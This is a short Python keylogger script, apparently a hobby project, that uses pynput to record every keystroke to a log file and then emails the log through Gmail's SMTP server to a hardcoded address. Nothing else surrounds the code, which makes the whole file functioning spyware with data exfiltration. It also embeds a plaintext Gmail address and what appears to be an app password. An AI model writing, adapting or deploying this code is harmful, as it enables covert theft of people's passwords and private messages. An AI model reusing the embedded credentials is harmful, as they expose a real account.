import pynput

from pynput.keyboard import Key,Listener

count = 0
keys = []

dosya = open("log.txt", "w+", encoding="utf-8")
dosya=""

def on_press(key):
    global count,keys
    count += 1
    print("{0} pressed".format(key))
    keys.append(key)

    if count >= 10:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    with open("log.txt" , "a" , encoding="utf-8") as file:
        for key in keys:

            k = str(key).replace("'", "")
            if k.find("space") > 0:
                file.write("\n")
            elif k.find("Key") == -1:
                file.write(k)
            

def on_release(key):
    if key == Key.esc:
        print("exit")
        return False


with Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join()

dosya = open("log.txt", "r", encoding="utf-8")



from smtplib import SMTP
msg=oku = dosya.read()
subject = " test "
message = msg
content ="subject : {} \n\n".format(subject,message)

mymail="orcun8522@gmail.com"
password="dwdmqcupilymnfls"

sendto="orcun8522@gmail.com"

mail = SMTP("SMTP.gmail.com",587)
mail.ehlo()
mail.starttls()
mail.login(mymail,password)
mail.sendmail(mymail,sendto,message.encode("utf-8"))
print("basarili")